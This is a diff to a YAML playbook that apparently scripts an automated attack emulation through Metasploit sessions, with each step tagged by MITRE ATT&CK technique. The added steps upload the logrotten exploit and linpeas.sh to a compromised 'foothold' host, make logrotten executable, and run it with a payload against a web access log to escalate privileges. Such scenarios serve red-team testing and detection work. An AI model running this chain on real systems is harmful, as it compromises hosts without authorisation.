@@ -75,11 +75,21 @@ commands:
 
   - type: msf-session
     session: "foothold"
+    cmd: upload /var/www/html/logrotten
+    metadata:
+      techniques: "T1105"
+      tactics: "Command and Control"
+      technique_name: "Ingress Tool Transfer"
+
+
+  - type: msf-session
+    session: "foothold"
     cmd: upload /var/www/html/linpeas.sh
     metadata:
       techniques: "T1105"
       tactics: "Command and Control"
       technique_name: "Ingress Tool Transfer"
+
 
   - type: msf-session
     cmd: shell
@@ -119,6 +129,14 @@ commands:
 
   - type: msf-session
     cmd: 'export PS1="PWN >"'
+    session: "foothold"
+    metadata:
+      techniques: "T1059"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter"
+
+  - type: msf-session
+    cmd: chmod +x logrotten
     session: "foothold"
     metadata:
       techniques: "T1059"
@@ -198,8 +216,9 @@ commands:
       tactics: "Privilege Escalation,Persistence"
       technique_name: "Event Triggered Execution"
 
+
   - type: msf-session
-    cmd: "./logrotten -p /var/www/default/payload /var/www/default/log/accesss.log"
+    cmd: "/tmp/logrotten -p /var/www/default/payload /var/www/default/log/accesss.log"
     session: "foothold"
     metadata:
       techniques: "T1546"
